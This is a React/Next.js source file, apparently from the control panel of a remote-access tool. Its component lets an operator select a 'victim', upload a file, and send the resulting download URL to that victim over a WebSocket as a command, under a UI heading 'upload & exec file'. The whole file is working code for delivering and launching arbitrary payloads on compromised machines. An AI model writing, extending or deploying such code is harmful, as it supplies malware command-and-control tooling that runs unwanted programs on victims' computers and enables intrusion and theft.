"use client";

import Image from "next/image";
import { useEffect } from "react";

import { csrfHeaders } from "../../../builder/utils/csrf";
import { showToast } from "../../../toast";
import { usePanelWS } from "../../../ws/ws-provider";
import { usePanelDetailView } from "../panel-detail-view-provider";

export function RemoteStartSection() {
   const ws = usePanelWS();
   const detail = usePanelDetailView();

   useEffect(() => {
      const fileInput = document.getElementById("remoteFileInput") as HTMLInputElement | null;
      const selectBlock = document.getElementById("remoteFileSelect");
      if (!fileInput || !selectBlock) return;

      const onPick = () => {
         const victimId = detail.selectedVictimId;
         if (!victimId) {
            showToast("error", "Select victim first");
            return;
         }
         fileInput.click();
      };

      const onChange = async () => {
         try {
            if (!fileInput.files || !fileInput.files.length) return;
            const file = fileInput.files[0];
            if (!file) return;

            const victimId = detail.selectedVictimId;
            if (!victimId) {
               showToast("error", "Select victim first");
               fileInput.value = "";
               return;
            }

            if (ws.state !== "open") {
               showToast("error", "WebSocket is not connected");
               fileInput.value = "";
               return;
            }

            const formData = new FormData();
            formData.append("file", file);

            const res = await fetch("/api/remote-upload", {
               method: "POST",
               credentials: "same-origin",
               headers: {
                  ...csrfHeaders(),
               },
               body: formData,
            });

            if (!res.ok) {
               let msg = "Upload failed";
               try {
                  const t = await res.text();
                  if (t && String(t).trim()) msg = String(t).trim();
               } catch {
               }
               showToast("error", msg);
               fileInput.value = "";
               return;
            }

            const data = (await res.json().catch(() => null)) as unknown;
            const url = (() => {
               if (!data || typeof data !== "object") return "";
               const rec = data as Record<string, unknown>;
               return typeof rec.url === "string" ? String(rec.url) : "";
            })();
            if (!url) {
               showToast("error", "Bad upload response");
               fileInput.value = "";
               return;
            }

            const ok = ws.sendJson({
               type: "command",
               victim_id: String(victimId),
               command: url,
            });

            if (!ok) {
               showToast("error", "Failed to send command");
               fileInput.value = "";
               return;
            }

            showToast("success", "Remote start command sent");
         } catch {
            showToast("error", "Remote start error");
         } finally {
            try {
               fileInput.value = "";
            } catch {
            }
         }
      };

      selectBlock.addEventListener("click", onPick);
      fileInput.addEventListener("change", onChange);

      return () => {
         selectBlock.removeEventListener("click", onPick);
         fileInput.removeEventListener("change", onChange);
      };
   }, [detail.selectedVictimId, ws]);

   return (
      <div className="detail-section h-full">
         <div
            className={
               "w-[600px] max-w-[min(920px,calc(100vw-260px))] rounded-[18px] border border-white/15 bg-[rgba(18,18,18,0.66)] " +
               "p-[16px_18px_18px] shadow-[0_0_0_1px_rgba(0,0,0,0.7),0_20px_46px_rgba(0,0,0,0.85)] backdrop-blur-[14px]"
            }
         >
            <div
               id="remoteFileSelect"
               className="grid place-items-center rounded-[16px] border border-white/10 bg-black/20 p-[18px]"
            >
               <div className="text-[18px] font-extrabold uppercase tracking-[0.05em] text-white/95">upload &amp; exec file</div>

               <div className="mt-[14px] grid place-items-center gap-[10px]">
                  <Image
                     src="/icons/remote-start.svg"
                     alt="remote start"
                     width={54}
                     height={54}
                     draggable={false}
                     className="opacity-90 invert"
                  />
                  <div className="text-[14px] font-extrabold tracking-[0.06em] text-white/90">SELECT FILE</div>
               </div>

               <input id="remoteFileInput" type="file" className="hidden" />
            </div>

            <div className="mt-[12px] h-[2px] w-full bg-[var(--line)] opacity-95" />
         </div>
      </div>
   );
}